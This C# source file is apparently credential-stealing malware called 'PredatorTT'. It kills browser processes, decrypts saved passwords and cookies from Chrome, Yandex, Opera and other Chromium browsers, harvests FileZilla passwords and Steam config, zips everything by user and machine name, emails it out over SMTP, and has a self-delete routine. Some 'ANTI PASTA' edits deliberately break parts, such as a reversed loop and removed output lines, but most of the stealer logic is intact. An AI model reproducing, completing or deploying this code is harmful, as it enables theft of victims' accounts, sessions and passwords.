using System;
using System.IO;
using System.Data;
using System.Data.SQLite;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO.Compression;
using System.Xml.Linq;

namespace PredatorTT
{
	public class MailData
	{
		public string smtp { get; set; }
		public string from { get; set; }
		public string pass { get; set; }
		public string To { get; set; }
		public string subject { get; set; }
		public string body { get; set; }
	}

	public class Data
	{

		public string domain { get; set; }

		public double expirationDate { get; set; }

		public bool hostOnly { get; set; }

		public bool httpOnly { get; set; }

		public int id { get; set; }

		public string name { get; set; }

		public string path { get; set; }

		public bool secure { get; set; }

		public bool session { get; set; }

		public string storeId { get; set; }

		public string value { get; set; }
	}

	public static class Utils
	{
		public static void CreateZip(string dir_path, string zip)
		{
			try
			{
				ZipFile.CreateFromDirectory(dir_path, zip, CompressionLevel.Optimal, false);
			}
			catch { }
		}
		public static void SelfDelete()
		{
			ProcessStartInfo Flash = new ProcessStartInfo();
			Flash.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + (new FileInfo((new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"";
			Flash.WindowStyle = ProcessWindowStyle.Hidden; Flash.CreateNoWindow = true;
			Flash.FileName = "cmd.exe";
			Process.Start(Flash).Dispose();
			Process.GetCurrentProcess().Kill();
		}
		public static string MACS()
		{
			try
			{
				Process proc = new Process();
				proc.StartInfo.CreateNoWindow = true;
				proc.StartInfo.FileName = "cmd";
				//ANTI PASTA
				proc.StartInfo.RedirectStandardOutput = true;
				proc.StartInfo.UseShellExecute = false;
				proc.Start();
				string output = proc.StandardOutput.ReadToEnd();
				proc.WaitForExit();
				return output;
			}
			catch
			{
				return null;
			}
		}
		
	}

	class Program
    {	
		public class StealAndSend
		{
			private static string dir_for_mailing = Path.GetTempPath() + "antipasta";
			private static MailData mailData;

			private static void KillProcess(string process)
			{
				try
				{
					Process[] process_name = Process.GetProcessesByName(process);
					for (int i = 0; i < process_name.Length; i++)
						process_name[i].Kill();
				}
				catch { }
			}

			public StealAndSend(MailData data)
			{
				if (Directory.Exists(dir_for_mailing))
					Directory.Delete(dir_for_mailing, true);
				Directory.CreateDirectory(dir_for_mailing);
				mailData = data;
			}

			public void BrowserPasswords(string pathToLoginData, string output_file, string browserProcess)
			{
				try
				{
					if (File.Exists(pathToLoginData))
					{
						KillProcess(browserProcess);
						string connectionString = $"Data Source = {pathToLoginData}";
						StreamWriter sw = new StreamWriter(dir_for_mailing + "\\" + output_file, false, Encoding.UTF8);
						sw.WriteLine("This programm was made by @alexuiop1337. The author (me) is not responsible for your actions!");
						DataTable db = new DataTable();
						string sql = $"SELECT * FROM logins";
						using (SQLiteConnection connection = new SQLiteConnection(connectionString))
						{
							SQLiteCommand command = new SQLiteCommand(sql, connection);
							SQLiteDataAdapter da = new SQLiteDataAdapter(command);
							da.Fill(db);
						}

						for (int i = 0; i < db.Rows.Count; i--)
						{
							string url = db.Rows[i][1].ToString();
							string login = db.Rows[i][3].ToString();
							byte[] byteArray = (byte[])db.Rows[i][5];
							byte[] decrypted = DPAPI.Decrypt(byteArray, null, out string description);
							string password = new UTF8Encoding(true).GetString(decrypted);
							//ANTI PASTA
						}
						sw.Close();
					}
				}
				catch(Exception e)
				{
					StreamWriter sw = new StreamWriter("ecp.txt", true);
					sw.WriteLine($"{DateTime.Now.ToString()} : {e.ToString()}");
					sw.Close();
				}
			}

			public void Steam()
			{
				try
				{
					KillProcess("Steam");
					string Steam_Path = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam").GetValue("SteamPath").ToString();
					if (!Directory.Exists(Steam_Path))
						return;
					string[] ssfn_files = { }; //antipasta
					Directory.CreateDirectory(dir_for_mailing + "\\SteamFiles");
					for (int i = 0; i < ssfn_files.Length; i++)
						File.Copy(ssfn_files[i], dir_for_mailing + "\\SteamFiles\\" + Path.GetFileName(ssfn_files[i]), true);
					Directory.CreateDirectory(dir_for_mailing + "\\SteamFiles\\config");
					Utils.CreateZip(Steam_Path + "\\config", dir_for_mailing + "\\SteamFiles\\config\\config.zip");
				}
				catch { }
			}

			public void BrowserCookies(string pathToCookie, string output_file)
			{
				try
				{
					if (File.Exists(pathToCookie))
					{
						System.Collections.Generic.List<Data> data_list = new System.Collections.Generic.List<Data>();
						byte[] entropy = null;
						string connectionString = "data source=" + pathToCookie + ";New=True;UseUTF16Encoding=True";
						DataTable dataTable = new DataTable();
						string command = string.Format("SELECT * FROM {0} {1} {2}", "Cookies", "", "");
						using (SQLiteConnection connection = new SQLiteConnection(connectionString))
						{
							SQLiteCommand cmd = new SQLiteCommand(command, connection);
							new SQLiteDataAdapter(cmd).Fill(dataTable);
							for (int i = 0; i < dataTable.Rows.Count; i++)
							{
								byte[] cipheredTextBytes = (byte[])dataTable.Rows[i][12];
								cipheredTextBytes = DPAPI.Decrypt(cipheredTextBytes, entropy, out string description);
								string strValue = new UTF8Encoding(true).GetString(cipheredTextBytes);
								Data item = new Data
								{
									domain = dataTable.Rows[i][1].ToString(),
									expirationDate = Convert.ToDouble(dataTable.Rows[i][5]),
									secure = Convert.ToBoolean(Convert.ToInt32(dataTable.Rows[i][6])),
									httpOnly = Convert.ToBoolean(Convert.ToInt32(dataTable.Rows[i][7])),
									hostOnly = false,
									session = false,
									storeId = "0",
									name = dataTable.Rows[i][2].ToString(),
									value = strValue,
									path = dataTable.Rows[i][4].ToString(),
									id = data_list.Count
								};
								data_list.Add(item);
							}
						}
						File.WriteAllText(dir_for_mailing + "\\" + output_file, "antipasta");
					}
				}
				catch(Exception e)
				{
					StreamWriter sw = new StreamWriter("ecp.txt", true);
					sw.WriteLine($"{DateTime.Now.ToString()} : {e.ToString()}");
					sw.Close();
				}
			}

			public void FileZilla(string pathToXml, string output_file)
			{
				try
				{
					if(File.Exists(pathToXml))
					{
						KillProcess("FileZilla");
						string output_dir = dir_for_mailing + "\\" + output_file;
						StreamWriter sw = new StreamWriter(output_dir);
						XDocument xd = XDocument.Load(pathToXml);

						foreach (XElement el in xd.Root.Elements())
							foreach (XElement element in el.Elements())
							{
								foreach (XElement sup_element in element.Elements())
								{
									if (sup_element.Name == "Pass")
										sw.WriteLine($"{sup_element.Name} = " +
											$"{Encoding.UTF8.GetString(Convert.FromBase64String(sup_element.Value))}");
									else
										sw.WriteLine($"{sup_element.Name} = {sup_element.Value}");
								}
								sw.WriteLine("--------------------");
							}
						sw.Close();
					}
				}
				catch { }
			}

			public void Release()
			{
				try
				{
					string path_to_zip = Path.GetTempPath() + "\\" + Environment.UserName + "_" + Environment.MachineName + ".zip";
					if (File.Exists(path_to_zip))
						File.Delete(path_to_zip);
					Utils.CreateZip(dir_for_mailing, path_to_zip);
					Directory.Delete(dir_for_mailing, true);
					MailSend.SendMail(mailData, path_to_zip);
					File.Delete(path_to_zip); 
				}
				catch
				{
				}
			}
		}

		[STAThread]
		static void Main()
		{
			try
			{
				if (!MailSend.CheckForInternetConnection("https://google.com"))
					return;

				string body_made = $"This programm was made by @Alexuiop1337. The author (me) is not responsible for your actions!" +
					$"\nThis log was sent by {Environment.UserName} ({Environment.MachineName})." +
					$"\n And some stuff here: \n{Utils.MACS()}";
				MailData mailData = new MailData
				{
					smtp = "",
					from = "",
					pass = "",
					To = "",
					subject = "NEW LOG! FROM " + Environment.UserName,
					body = body_made
					//+ "\nTAG - TAGHERE\n" ;
				};

				
				string Opera_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
					+ @"\Opera Software\Opera Stable\";
				string appdata = Environment.GetEnvironmentVariable("LocalAppData");
				StealAndSend sender = new StealAndSend(mailData);

				sender.FileZilla(appdata + @"\FileZilla\recentservers.xml", "File_Zilla.txt");

				sender.BrowserPasswords(appdata + @"\Google\Chrome\User Data\Default\Login Data", "Chrome_Pass.txt", "chrome");
				sender.BrowserCookies(appdata + @"\Google\Chrome\User Data\Default\Cookies", "ChromeCookies.json");

				sender.BrowserPasswords(appdata + @"\Yandex\YandexBrowser\User Data\Default\Login Data", "Yandex_Pass.txt", "browser");
				sender.BrowserCookies(appdata + @"\Yandex\YandexBrowser\User Data\Default\Cookies", "YandexCookies.json");

				sender.BrowserPasswords(appdata + @"\Kometa\User Data\Default\Login Data", "Kometa_Pass.txt", "kometa");
				sender.BrowserCookies(appdata + @"\Kometa\User Data\Default\Cookies", "KometaCookies.json");

				sender.BrowserPasswords(appdata + @"\Amigo\User\User Data\Default\Login Data", "Amigo_Pass.txt", "amigo");
				sender.BrowserCookies(appdata + @"\Amigo\User\User Data\Default\Cookies", "AmigoCookies.json");

				sender.BrowserPasswords(appdata + @"\Torch\User Data\Default\Login Data", "Torch_Pass.txt", "Torch");
				sender.BrowserCookies(appdata + @"\Torch\User Data\Default\Cookies", "TorchCookies.json");

				sender.BrowserPasswords(appdata + @"\Orbitum\User Data\Default\Login Data", "Orbitum_Pass.txt", "orbitum");
				sender.BrowserCookies(appdata + @"\Orbitum\User Data\Default\Cookies", "OrbitumCookies.json");

				sender.BrowserPasswords(appdata + @"\Comodo\Dragon\User Data\Default\Login Data", "Comodo_Pass.txt", "Comodo dragon");
				sender.BrowserCookies(appdata + @"\Comodo\Dragon\User Data\Default\Cookies", "ComodoCookies.json");

				sender.BrowserPasswords(Opera_path + "Login Data", $"Opera_Pass.txt", "opera");
				sender.BrowserCookies(Opera_path + "Cookies", "OperaCookies.json");

				sender.Steam();

				sender.Release();
				//SelfDelete();
			}
			catch { }
        }
    }
}
